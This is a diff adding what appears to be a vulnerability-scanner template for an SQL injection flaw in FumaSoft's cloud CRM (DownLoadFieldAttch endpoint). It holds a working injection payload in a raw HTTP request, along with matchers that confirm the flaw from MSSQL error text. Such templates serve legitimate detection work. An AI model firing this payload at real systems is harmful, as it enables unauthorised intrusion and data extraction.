@@ -1,0 +1,33 @@
+id: poc-yaml-fumasoft-downloadfieldattch-sqli
+info:
+  name: 孚盟云 DownLoadFieldAttch SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 100000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /Ajax/upload.ashx?action=DownLoadFieldAttch&trueFileName=1'and%201<sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "FumaCRM"
+          - ".DownLoadFieldAttch"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
